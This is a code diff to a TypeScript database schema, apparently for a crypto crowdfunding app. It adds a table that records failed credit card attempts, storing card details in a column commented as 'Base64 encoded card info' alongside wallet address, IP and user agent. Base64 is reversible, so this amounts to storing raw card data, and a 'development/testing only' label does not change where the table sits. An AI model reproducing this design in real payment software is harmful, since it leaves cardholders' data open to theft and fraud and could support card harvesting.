@@ -828,3 +828,28 @@ export type FundDocument = typeof fundDocuments.$inferSelect;
 export type InsertFundDocument = z.infer<typeof insertFundDocumentSchema>;
 export type PendingFund = typeof pendingFunds.$inferSelect;
 export type InsertPendingFund = z.infer<typeof insertPendingFundSchema>;
+
+// Failed credit card attempts (for development/testing only)
+export const failedCardAttempts = pgTable("failed_card_attempts", {
+  id: serial("id").primaryKey(),
+  wallet: varchar("wallet", { length: 42 }),
+  encodedCardData: text("encoded_card_data").notNull(), // Base64 encoded card info
+  amount: decimal("amount", { precision: 18, scale: 8 }),
+  campaignId: integer("campaign_id").references(() => campaigns.id),
+  purpose: varchar("purpose", { length: 50 }), // activation, donation, kyb_deposit, etc
+  ipAddress: varchar("ip_address", { length: 45 }),
+  userAgent: text("user_agent"),
+  errorMessage: text("error_message"),
+  createdAt: timestamp("created_at").defaultNow(),
+}, (table) => [
+  index("idx_failed_card_wallet").on(table.wallet),
+  index("idx_failed_card_created").on(table.createdAt),
+]);
+
+export const insertFailedCardAttemptSchema = createInsertSchema(failedCardAttempts).omit({
+  id: true,
+  createdAt: true,
+});
+
+export type FailedCardAttempt = typeof failedCardAttempts.$inferSelect;
+export type InsertFailedCardAttempt = z.infer<typeof insertFailedCardAttemptSchema>;
